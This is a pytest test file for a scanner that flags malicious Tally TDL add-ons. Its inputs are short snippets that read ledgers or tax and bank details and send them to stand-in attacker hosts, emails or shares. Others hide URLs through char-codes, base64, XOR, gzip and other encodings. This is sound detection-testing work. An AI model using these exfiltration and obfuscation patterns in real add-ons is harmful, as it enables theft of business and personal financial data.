"""
test_scanner.py — Validates the detector and all five detection-intelligence
features: deobfuscation, data-flow pairing, destination triage, confidence
scoring, and rule packs.

Design note: "malicious" inputs are short inline TDL snippets built from the rule
tokens, not shippable add-ons. That fully exercises detection (the scanner matches
source text) without this repo ever containing a usable stealer.

Run:  pytest -q
"""

import base64
import codecs
import sys
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from rules import ALL_PACKS  # noqa: E402
import re  # noqa: E402

from tdl_scanner import (  # noqa: E402
    analyze, analyze_files, scan_source, verdict_for, score, Config, default_config,
    diff_reports, _build_custom_rules,
)
from rules import Rule  # noqa: E402
import reputation  # noqa: E402
from egress import format_egress  # noqa: E402
import deobfuscate  # noqa: E402
import destinations as dst  # noqa: E402
import dataflow  # noqa: E402


def cats(text, config=None):
    return {f.category for f in analyze(text, config).findings}


def by_id(findings, rule_id):
    return [f for f in findings if f.rule_id == rule_id]


# =========================================================================
# Baseline detection (source-level rules)
# =========================================================================
def test_detects_http_get():
    fs = scan_source('Set Value : $$HttpGet:@@Endpoint:""')
    assert by_id(fs, "NET001") and fs[0].severity == "CRITICAL"


def test_detects_http_post_action():
    assert "network" in cats('Action : HTTP Post : @@Url : "" : "" : @@Body')


def test_detects_remote_url_collection():
    assert "network" in cats("    RemoteURL : @@SyncTarget")


def test_detects_file_write():
    assert "filesystem" in cats("    Set File : @@OutPath")


def test_detects_startup_hook():
    assert "autorun" in cats("[System : Startup]")


def test_detects_sensitive_collection():
    assert "data-access" in cats("    Type : Ledger")


def test_detects_licensing_config_write():
    assert "licensing" in cats('Set : Cfg : "tally.ini"')


def test_plain_ui_addon_is_clean():
    benign = """
[#Part : Simple]
    Line : Greeting
[Field : Name Field]
    Set : Info : "Hello from a harmless add-on"
"""
    assert analyze(benign).findings == []
    assert analyze(benign).verdict.startswith("CLEAN")


def test_commented_ledger_read_is_ignored():
    assert "data-access" not in cats(";; Type : Ledger  (old code)")


# =========================================================================
# Feature 1: Deobfuscation engine
# =========================================================================
def test_charcode_decodes_to_text():
    codes = " + ".join(f"$$StrByCharCode:{ord(c)}" for c in "hi there")
    arts = deobfuscate.deobfuscate(f"Set : X : {codes}")
    assert any(a.method == "charcode" and a.decoded == "hi there" for a in arts)


def test_charcode_hidden_url_is_flagged_as_network():
    url = "http://hidden.example.invalid/steal"
    codes = " + ".join(f"$$StrByCharCode:{ord(c)}" for c in url)
    findings = analyze(f"[Function : X]\n 10 : SET : U : {codes}").findings
    net = [f for f in findings if f.category == "network" and f.source == "deobfuscated"]
    assert net, "hidden URL should be revealed by the deobfuscator"


def test_base64_hidden_url_is_flagged():
    blob = base64.b64encode(b"http://evil.example.invalid/x").decode()
    findings = analyze(f'Set : B : "{blob}"').findings
    assert any(f.source == "deobfuscated" and f.category == "network" for f in findings)


def test_hex_hidden_url_is_flagged():
    blob = b"http://evil.example.invalid/h".hex()
    findings = analyze(f'Set : H : "{blob}"').findings
    assert any(f.source == "deobfuscated" and f.category == "network" for f in findings)


def test_random_base64_without_rule_hit_is_silent():
    # A long token that decodes to nothing rule-worthy must not create findings.
    blob = base64.b64encode(b"just some ordinary configuration value here").decode()
    findings = [f for f in analyze(f'Set : B : "{blob}"').findings
                if f.source == "deobfuscated"]
    assert findings == []


def test_deobfuscated_finding_has_higher_confidence():
    # Hidden URL (NET005, base MEDIUM) bumps +1 for being obfuscated. Use a public
    # host so the destination triage also escalates rather than reducing it.
    url = "http://drop.example.com/y"
    codes = " + ".join(f"$$StrByCharCode:{ord(c)}" for c in url)
    net = [f for f in analyze(f"Set : U : {codes}").findings
           if f.category == "network" and f.source == "deobfuscated"]
    assert net and net[0].confidence == "HIGH"


# =========================================================================
# Feature 2: Data-flow pairing
# =========================================================================
def test_dataflow_pairs_read_and_send_in_same_block():
    text = """
[Function : Harvest]
    10 : WALK COLLECTION : Ledger
    20 : SET : Out : $$HttpGet:@@U:""
"""
    findings = analyze(text).findings
    assert any(f.rule_id == "FLOW001" for f in findings)
    assert analyze(text).verdict.startswith("DANGEROUS")


def test_dataflow_does_not_pair_across_separate_blocks():
    text = """
[Function : OnlyReads]
    10 : WALK COLLECTION : Ledger
[Function : OnlySends]
    10 : SET : Out : $$HttpGet:@@U:""
"""
    assert not by_id(analyze(text).findings, "FLOW001")


def test_dataflow_pairs_read_and_file_write():
    text = """
[Function : Dump]
    10 : Type : Voucher
    20 : Set File : @@Path
"""
    assert by_id(analyze(text).findings, "FLOW001")


def test_find_blocks_partitions_source():
    text = "top\n[Function : A]\n x\n[Collection : B]\n y"
    blocks = dataflow.find_blocks(text)
    kinds = [b.kind for b in blocks]
    assert kinds == ["(top-level)", "Function", "Collection"]


# =========================================================================
# Feature 3: Destination analysis
# =========================================================================
def test_classify_public_host_unknown():
    d = dst.classify_url("https://8.8.8.8/collect")
    assert d.classification == dst.CLASS_UNKNOWN


def test_classify_localhost_private():
    assert dst.classify_url("http://127.0.0.1:8899/x").classification == dst.CLASS_PRIVATE
    assert dst.classify_url("http://192.168.1.5/y").classification == dst.CLASS_PRIVATE
    assert dst.classify_url("http://intranet/z").classification == dst.CLASS_PRIVATE


def test_classify_allowlisted_host():
    d = dst.classify_url("https://api.mycrm.com/sync", allowlist={"mycrm.com"})
    assert d.classification == dst.CLASS_ALLOWLISTED


def test_unknown_host_url_confidence_escalated():
    findings = analyze('Set : U : "https://drop.example.com/x"').findings
    net = by_id(findings, "NET005")
    assert net and net[0].confidence == "HIGH"     # MEDIUM base + unknown-internet bump


def test_allowlisted_host_url_confidence_reduced():
    cfg = Config(packs=ALL_PACKS, allowlist=frozenset({"mycrm.com"}))
    findings = analyze('Set : U : "https://api.mycrm.com/sync"', cfg).findings
    net = by_id(findings, "NET005")
    assert net and net[0].confidence == "LOW"      # MEDIUM base - allowlist bump


def test_report_lists_destinations():
    report = analyze('Set : U : "https://drop.example.com/x"')
    assert any(d["host"] == "drop.example.com" for d in report.destinations)


# =========================================================================
# Feature 4: Confidence scoring
# =========================================================================
def test_low_confidence_findings_weigh_less():
    cfg = Config(packs=ALL_PACKS, allowlist=frozenset({"mycrm.com"}))
    allow = score(analyze('Set : U : "https://api.mycrm.com/x"', cfg).findings)
    unknown = score(analyze('Set : U : "https://drop.example.com/x"').findings)
    assert unknown > allow


def test_score_increases_with_severity():
    low = score(analyze("    Type : Ledger").findings)
    high = score(analyze('Set : X : $$HttpGet:@@U:""').findings)
    assert high > low


# =========================================================================
# Feature 5: Rule packs
# =========================================================================
def test_disabling_exfiltration_pack_drops_network():
    cfg = Config(packs=frozenset({"persistence"}))
    assert "network" not in cats('Set : X : $$HttpGet:@@U:""', cfg)
    assert "autorun" in cats("[System : Startup]", cfg)


def test_privacy_pack_isolates_data_access():
    cfg = Config(packs=frozenset({"privacy"}))
    c = cats("    Type : Ledger", cfg)          # unfiltered read → also bulk-harvest
    assert "data-access" in c and "network" not in c
    assert analyze('Set : X : $$HttpGet:@@U:""', cfg).findings == []


def test_licensing_pack_toggles_license_rules():
    on = Config(packs=frozenset({"licensing-bypass"}))
    off = Config(packs=frozenset({"privacy"}))
    assert "licensing" in cats('Set : Cfg : "tally.ini"', on)
    assert "licensing" not in cats('Set : Cfg : "tally.ini"', off)


def test_all_packs_enabled_by_default():
    assert default_config().packs == ALL_PACKS


# =========================================================================
# Verdict logic
# =========================================================================
def test_hidden_network_is_dangerous():
    url = "http://x.example.invalid/y"
    codes = " + ".join(f"$$StrByCharCode:{ord(c)}" for c in url)
    assert analyze(f"Set : U : {codes}").verdict.startswith("DANGEROUS")


def test_network_alone_requires_review():
    assert analyze('Set : X : $$HttpGet:@@U:""').verdict.startswith("REVIEW REQUIRED")


def test_licensing_alone_is_suspicious():
    assert analyze('Set : Cfg : "tally.ini"').verdict.startswith("SUSPICIOUS")


# =========================================================================
# The shipped demo fixture behaves as documented
# =========================================================================
def test_risky_demo_fixture_is_flagged_dangerous():
    demo = Path(__file__).resolve().parent.parent / "samples" / "risky_demo.tdl"
    report = analyze(demo.read_text(encoding="utf-8"))
    assert report.verdict.startswith("DANGEROUS")
    assert by_id(report.findings, "FLOW001")
    assert any(f.source == "deobfuscated" for f in report.findings)
    assert "licensing" in report.capabilities


# =========================================================================
# Cross-block data-flow (FLOW002) — the "look innocent" split
# =========================================================================
def test_cross_block_taint_read_then_send():
    text = """
[Function : Harvest]
    10 : SET : Info : $$CmpMailingName
[Function : Send]
    10 : SET : Out : $$HttpGet:@@U:##Info
"""
    findings = analyze(text).findings
    assert by_id(findings, "FLOW002")
    assert analyze(text).verdict.startswith("DANGEROUS")


def test_cross_block_taint_propagates_through_variables():
    text = """
[Function : A]
    10 : SET : X : $$CmpMailingName
    20 : SET : Y : ##X
[Function : B]
    10 : SET : Z : $$HttpGet:@@U:##Y
"""
    assert by_id(analyze(text).findings, "FLOW002")


def test_cross_block_taint_to_file_sink():
    text = """
[Function : Grab]
    10 : SET : Data : $$CmpMailingName
[Function : Dump]
    10 : Set File : @@Path : ##Data
"""
    flows = by_id(analyze(text).findings, "FLOW002")
    assert flows and flows[0].category == "data-flow"


def test_same_block_is_not_cross_block_but_is_flow001():
    text = """
[Function : Both]
    10 : SET : Info : $$CmpMailingName
    20 : SET : Out : $$HttpGet:@@U:##Info
"""
    findings = analyze(text).findings
    assert by_id(findings, "FLOW001")
    assert not by_id(findings, "FLOW002")


def test_untainted_variable_is_not_flagged():
    text = """
[Function : A]
    10 : SET : Info : "just a label"
[Function : B]
    10 : SET : Out : $$HttpGet:@@U:##Info
"""
    assert not by_id(analyze(text).findings, "FLOW002")


# =========================================================================
# Deep deobfuscation — every hiding trick must be unwound
# =========================================================================
PUBLIC_URL = "http://drop.example.com/x"


def _charcode(s):
    return " + ".join(f"$$StrByCharCode:{ord(c)}" for c in s)


def _evasion_cases():
    b64 = base64.b64encode(PUBLIC_URL.encode()).decode()
    dbl = base64.b64encode(b64.encode()).decode()
    hexed = PUBLIC_URL.encode().hex()
    xored = bytes(b ^ 0x2A for b in PUBLIC_URL.encode()).hex()
    rev = PUBLIC_URL[::-1]
    rot = codecs.encode(PUBLIC_URL, "rot_13")
    urlenc = "http%3A%2F%2Fdrop.example.com%2Fx"
    gz = base64.b64encode(zlib.compress(PUBLIC_URL.encode())).decode()
    return {
        "charcode":          f'[Function : X]\n 10 : SET : U : {_charcode(PUBLIC_URL)}',
        "base64":            f'[Function : X]\n 10 : SET : U : "{b64}"',
        "hex":               f'[Function : X]\n 10 : SET : U : "{hexed}"',
        "reverse":           f'[Function : X]\n 10 : SET : U : "{rev}"',
        "rot13":             f'[Function : X]\n 10 : SET : U : "{rot}"',
        "xor":               f'[Function : X]\n 10 : SET : U : "{xored}"',
        "double-base64":     f'[Function : X]\n 10 : SET : U : "{dbl}"',
        "charcode-of-base64": f'[Function : X]\n 10 : SET : U : {_charcode(b64)}',
        "url-encoding":      f'[Function : X]\n 10 : SET : U : "{urlenc}"',
        "gzip-base64":       f'[Function : X]\n 10 : SET : U : "{gz}"',
        "split-literals":    f'[Function : X]\n 10 : SET : U : "http://drop." + "example.com/x"',
        "split-across-vars": ('[Function : X]\n'
                              ' 10 : SET : A : "http://drop."\n'
                              ' 20 : SET : B : "example.com/x"\n'
                              ' 30 : SET : U : ##A + ##B'),
    }


def test_every_evasion_variant_is_caught():
    failures = []
    for name, text in _evasion_cases().items():
        if "network" not in cats(text):
            failures.append(name)
    assert not failures, f"missed hidden URL via: {', '.join(failures)}"


def test_deobfuscation_is_recursive():
    # base64(base64(url)) must be peeled twice.
    dbl = base64.b64encode(base64.b64encode(PUBLIC_URL.encode())).decode()
    findings = analyze(f'Set : U : "{dbl}"').findings
    assert any(f.source == "deobfuscated" and f.category == "network" for f in findings)


def test_split_string_reassembly_across_lines():
    text = ('[Function : X]\n'
            ' 10 : SET : A : "http://drop."\n'
            ' 20 : SET : B : "example.com/x"\n'
            ' 30 : SET : U : ##A + ##B')
    assert "network" in cats(text)


# =========================================================================
# False-alarm corpus — genuinely benign add-ons must stay quiet
# =========================================================================
def _benign_files():
    root = Path(__file__).resolve().parent / "corpus" / "benign"
    return sorted(root.glob("*.tdl"))


def test_benign_corpus_present():
    assert _benign_files(), "benign corpus is missing"


def test_benign_addons_are_not_dangerous():
    noisy = []
    for path in _benign_files():
        report = analyze(path.read_text(encoding="utf-8"))
        ok = (report.verdict.startswith(("CLEAN", "CAUTION"))
              and "network" not in report.capabilities
              and not by_id(report.findings, "FLOW001")
              and not by_id(report.findings, "FLOW002"))
        if not ok:
            noisy.append(f"{path.name}: {report.verdict}")
    assert not noisy, "benign add-ons wrongly flagged: " + "; ".join(noisy)


# =========================================================================
# Robustness / performance — must never crash on hostile input
# =========================================================================
def test_empty_input():
    r = analyze("")
    assert r.findings == [] and r.verdict.startswith("CLEAN")


def test_binary_and_control_chars_do_not_crash():
    analyze("Set : X : \x00\x01\x02 \xff\xfe garbage \x7f end")


def test_large_input_completes():
    big = "Set : X : some ordinary value here\n" * 5000
    assert isinstance(analyze(big).findings, list)


def test_deeply_nested_charcode_terminates():
    # A long char-code chain must decode without hanging.
    chain = _charcode("A" * 300)
    analyze(f"Set : X : {chain}")


def test_huge_single_token_is_handled():
    blob = "A" * 5000
    r = analyze(f'Set : X : "{blob}"')       # trips OBF002, must not crash
    assert isinstance(r.findings, list)


def test_leading_bom_does_not_break_block_parsing():
    # A UTF-8 BOM before the first header must not hide it, so cross-block taint
    # still attributes the source to the right function.
    text = ("﻿[Function : Read]\n"
            "    10 : SET : S : $$CmpMailingName\n"
            "[Function : Send]\n"
            "    10 : SET : O : $$HttpGet:@@U:##S")
    flows = by_id(analyze(text).findings, "FLOW002")
    assert flows and flows[0].detail.startswith("'s' read in Function:Read")


# =========================================================================
# Track 1 — wider capability coverage
# =========================================================================
def test_detects_dll_call_as_code_execution():
    r = analyze("    10 : CALL DLL : evilhelper : Steal")
    assert "code-exec" in r.capabilities
    assert r.verdict.startswith("DANGEROUS")


def test_detects_launch_external_program():
    assert "code-exec" in cats("    Action : EXECUTE : cmd")


def test_detects_executable_reference():
    assert "code-exec" in cats('    Set : P : "C:\\Temp\\payload.exe"')


def test_detects_db_export():
    assert "db-export" in cats("    10 : SQLExecute : Insert Into remote_tbl")


def test_detects_email_send():
    assert "email" in cats("    Action : SendMail : @@Server : @@Body")


def test_detects_network_share_write():
    assert "network-share" in cats('    Set File : "\\\\attacker-pc\\drop\\data.txt"')


def test_detects_local_file_read():
    assert "file-read" in cats("    10 : Read File : @@SomePath")


def test_detects_machine_fingerprinting():
    assert "recon" in cats("    Set : M : $$MachineName")


def test_detects_module_loader():
    assert "loader" in cats("[System : TDL]")


def test_detects_pii_bank_details():
    assert "pii" in cats("    Set : B : $$IFSC")


def test_dynamic_recipient_email_is_routine_caution():
    # Emailing a customer (recipient pulled from a field) is routine, not a flag.
    v = analyze("    Action : SendMail : @@Server : @@CustomerEmail : @@Invoice").verdict
    assert v.startswith("CAUTION")


def test_hardcoded_recipient_email_is_review():
    # A hard-coded unknown recipient is the exfil pattern → escalate.
    v = analyze('    Action : SendMail : @@Server : "attacker@evil.tld" : @@Body').verdict
    assert v.startswith("REVIEW REQUIRED")


def test_bulk_read_plus_email_is_dangerous():
    text = ("[System : Startup]\n 10 : WALK COLLECTION : Ledger\n"
            " 20 : SendMail : @@S : @@To : @@Body")
    assert analyze(text).verdict.startswith("DANGEROUS")


def test_allowlisted_email_domain_is_not_escalated():
    cfg = Config(allowlist=frozenset({"mycompany.com"}))
    v = analyze('SendMail : @@S : "billing@mycompany.com" : @@B', cfg).verdict
    assert v.startswith("CAUTION")


def test_cross_block_taint_to_email_sink():
    text = """
[Function : Grab]
    10 : SET : Data : $$CmpMailingName
[Function : Mail]
    10 : SendMail : @@Server : ##Data
"""
    assert by_id(analyze(text).findings, "FLOW002")


# --- new decoders ---
def test_url_encoded_hidden_url_is_caught():
    assert "network" in cats('Set : U : "http%3A%2F%2Fdrop.example.com%2Fx"')


def test_gzip_hidden_url_is_caught():
    blob = base64.b64encode(zlib.compress(b"http://drop.example.com/x")).decode()
    findings = analyze(f'Set : U : "{blob}"').findings
    assert any(f.source == "deobfuscated" and f.category == "network" for f in findings)


# =========================================================================
# Track 2 — deeper analysis
# =========================================================================
def test_interprocedural_tainted_arg_into_sink_function():
    text = """
[Function : Sender]
    10 : SET : Z : $$HttpGet:@@U:##Arg
[Function : Main]
    10 : SET : D : $$CmpMailingName
    20 : CALL : Sender : ##D
"""
    assert by_id(analyze(text).findings, "FLOW003")


def test_source_function_return_value_is_tainted():
    # Data read inside Harvest, returned, then sent from Main → still caught,
    # even though the send is in the same block as the call.
    text = """
[Function : Harvest]
    10 : SET : R : $$CmpMailingName
    20 : RETURN : ##R
[Function : Main]
    10 : SET : D : $$Harvest:1
    20 : SET : O : $$HttpGet:@@U:##D
"""
    assert by_id(analyze(text).findings, "FLOW002")


def test_cross_file_taint_when_merged():
    import tempfile, os
    d = tempfile.mkdtemp()
    reader = Path(d) / "reader.tdl"
    sender = Path(d) / "sender.tdl"
    reader.write_text("[Function : Reader]\n 10 : SET : Secret : $$CmpMailingName\n",
                      encoding="utf-8")
    sender.write_text("[Function : Sender]\n 10 : SET : O : $$HttpGet:@@U:##Secret\n",
                      encoding="utf-8")
    report = analyze_files([reader, sender])
    assert by_id(report.findings, "FLOW002")
    assert report.verdict.startswith("DANGEROUS")


def test_bulk_harvest_flag_on_unfiltered_type():
    assert "bulk-harvest" in cats("[Collection : All]\n    Type : Voucher")


def test_filtered_read_is_not_bulk_harvest():
    text = "[Collection : One]\n    Type : Ledger\n    Filter : ByName"
    assert "bulk-harvest" not in cats(text)


def test_pii_capabilities_are_reported():
    report = analyze("    10 : SET : G : $$GSTIN\n    20 : SET : A : $$IFSC")
    assert "pii" in report.capabilities


# =========================================================================
# Track 3 — trust & change-tracking
# =========================================================================
def test_reputation_new_known_changed_transitions():
    db = {}
    key, digest = "addon.tdl", reputation.sha256_text("v1 content")
    assert reputation.status(db, key, digest)[0] == reputation.STATUS_NEW
    reputation.remember(db, key, digest, verdict="CLEAN", risk_score=0, capabilities=[])
    assert reputation.status(db, key, digest)[0] == reputation.STATUS_KNOWN
    changed = reputation.sha256_text("v2 content — now with network")
    assert reputation.status(db, key, changed)[0] == reputation.STATUS_CHANGED


def test_reputation_remember_preserves_first_seen():
    db = {}
    reputation.remember(db, "a.tdl", "h1", verdict="CLEAN", risk_score=0, capabilities=[])
    first = db["a.tdl"]["first_seen"]
    reputation.remember(db, "a.tdl", "h2", verdict="DANGEROUS", risk_score=99,
                        capabilities=["network"])
    assert db["a.tdl"]["first_seen"] == first
    assert db["a.tdl"]["hash"] == "h2"


def test_reputation_roundtrip(tmp_path):
    p = tmp_path / "rep.json"
    db = {}
    reputation.remember(db, "x.tdl", "hh", verdict="CAUTION", risk_score=4, capabilities=["filesystem"])
    reputation.save(p, db)
    assert reputation.load(p)["x.tdl"]["risk_score"] == 4


def test_diff_detects_added_capability():
    old = analyze('[Field : F]\n Set as : "hello"')
    new = analyze('[Field : F]\n Set as : "hello"\n Set : U : $$HttpGet:@@U:""')
    d = diff_reports(old, new)
    assert "network" in d["capabilities_added"]
    assert "NET001" in d["findings_added"]


def test_custom_rule_from_config_fires():
    rule = Rule("ORG001", "Forbidden host", "network", "exfiltration",
                "CRITICAL", "HIGH", re.compile(r"evilcorp\.internal", re.I),
                "Company blocklist host.", "Reject.")
    cfg = Config(extra_rules=(rule,))
    findings = analyze("Set : U : http://evilcorp.internal/x", cfg).findings
    assert any(f.rule_id == "ORG001" for f in findings)


def test_custom_rule_respects_pack_toggle():
    rule = Rule("ORG002", "X", "network", "exfiltration", "HIGH", "HIGH",
                re.compile(r"zzmarker", re.I), "w", "r")
    on = Config(packs=frozenset({"exfiltration"}), extra_rules=(rule,))
    off = Config(packs=frozenset({"privacy"}), extra_rules=(rule,))
    assert any(f.rule_id == "ORG002" for f in analyze("zzmarker", on).findings)
    assert not any(f.rule_id == "ORG002" for f in analyze("zzmarker", off).findings)


def test_build_custom_rules_validates_severity():
    import pytest
    with pytest.raises(SystemExit):
        _build_custom_rules([{"regex": "x", "pack": "exfiltration", "severity": "NOPE"}])


def test_build_custom_rules_ok():
    rules = _build_custom_rules([{
        "id": "C1", "regex": "abc", "pack": "privacy", "severity": "MEDIUM",
        "category": "custom", "why": "w", "recommend": "r",
    }])
    assert len(rules) == 1 and rules[0].id == "C1"


# =========================================================================
# Adversarial hardening — gaps found by the exploration harness, now locked in
# =========================================================================
def _cc(s):
    return " + ".join(f"$$StrByCharCode:{ord(c)}" for c in s)


# --- newly-covered evasions (must be caught) ---
def test_ftp_url_is_caught():
    assert "network" in cats('SET : U : "ftp://evil.example.com/x"')


def test_xp_cmdshell_is_code_exec():
    assert "code-exec" in cats("EXEC xp_cmdshell")


def test_spaced_hex_hidden_url_is_caught():
    spaced = " ".join(f"{b:02x}" for b in b"http://drop.example.com/x")
    assert "network" in cats(f'SET : U : "{spaced}"')


def test_0x_hex_hidden_url_is_caught():
    blob = "0x" + b"http://drop.example.com/x".hex()
    assert "network" in cats(f"SET : U : {blob}")


def test_reversed_base64_hidden_url_is_caught():
    import base64 as b
    rb = b.b64encode(b"http://drop.example.com/x").decode()[::-1]
    assert "network" in cats(f'SET : U : "{rb}"')


def test_multibyte_xor_hidden_url_is_caught():
    raw = bytes(x ^ ((i % 3) + 1) for i, x in enumerate(b"http://drop.example.com/x"))
    assert "network" in cats(f'SET : U : "{raw.hex()}"')


def test_weird_case_httpget_is_caught():
    assert "network" in cats('SET : U : $$hTtPgEt:@@U:""')


# --- fixed false alarms (must NOT be flagged) ---
def _flagged(text):
    return analyze(text).verdict.startswith(("DANGEROUS", "REVIEW REQUIRED", "SUSPICIOUS"))


def test_url_in_comment_is_not_flagged():
    assert not _flagged(';; docs at http://example.com/help\n[Field:F]\n Set as:"hi"')


def test_exe_mention_in_help_is_not_dangerous():
    v = analyze('[Field:F]\n Set as : "Run setup.exe to install"').verdict
    assert not v.startswith("DANGEROUS")


def test_embedded_image_blob_is_not_flagged():
    import base64 as b
    icon = b.b64encode(b"\x89PNG\r\n" + b"\x00" * 200).decode()
    assert not _flagged(f'Set : Icon : "{icon}"')


def test_localhost_only_url_literal_is_softened():
    assert not _flagged('SET : U : "http://127.0.0.1:9000/sync"')


# --- regression guards: real egress must STILL flag (no blind spot) ---
def test_public_ip_url_still_flagged():
    assert _flagged('SET : U : "http://8.8.8.8/collect"')


def test_real_call_to_localhost_still_flagged():
    # An actual $$HttpGet call (not just a literal) is not softened.
    assert _flagged('SET : U : $$HttpGet:@@U:"http://127.0.0.1/x"')


def test_unknown_host_literal_still_flagged():
    assert _flagged('SET : U : "http://drop.example.com/x"')


# =========================================================================
# Egress report — "this data → this destination, approve?"
# =========================================================================
def test_egress_names_data_and_external_destination():
    text = ("[Function : H]\n 10 : WALK COLLECTION : Ledger\n"
            ' 20 : SendMail : @@S : "steal@evil.tld" : ##X')
    r = analyze(text)
    assert r.egress
    it = r.egress[0]
    assert it.channel == "email"
    assert it.location == "external"
    assert "evil.tld" in it.destination
    assert any("ledger" in d.lower() for d in it.data)


def test_egress_reports_pii_data_labels():
    text = ("[Function : H]\n 10 : SET : G : $$GSTIN\n 20 : SET : B : $$IFSC\n"
            ' 30 : SendMail : @@S : "x@evil.tld" : ##G')
    r = analyze(text)
    labels = " ".join(r.egress[0].data).lower()
    assert "tax" in labels or "bank" in labels


def test_egress_runtime_destination_is_unknown_high_concern():
    text = ("[Function : R]\n 10 : SET : S : $$CmpMailingName\n"
            "[Function : W]\n 10 : SET : O : $$HttpGet:@@RuntimeUrl:##S")
    r = analyze(text)
    assert any(e.location == "unknown" and e.concern == "HIGH" for e in r.egress)


def test_egress_localhost_destination_is_internal():
    text = ('[Function : H]\n 10 : WALK COLLECTION : Ledger\n'
            ' 20 : SET : O : $$HttpGet:@@U:"http://127.0.0.1/x"')
    r = analyze(text)
    assert r.egress and r.egress[0].location == "internal"


def test_no_egress_when_no_sensitive_data_flows():
    r = analyze("[Button:E]\n Action : Mail Report : Invoice : @@CustomerEmail")
    assert r.egress == []


def test_format_egress_is_plain_language():
    text = ("[Function : H]\n 10 : WALK COLLECTION : Ledger\n"
            ' 20 : SendMail : @@S : "steal@evil.tld" : ##X')
    lines = format_egress(analyze(text).egress)
    assert lines and "would be sent" in lines[0]
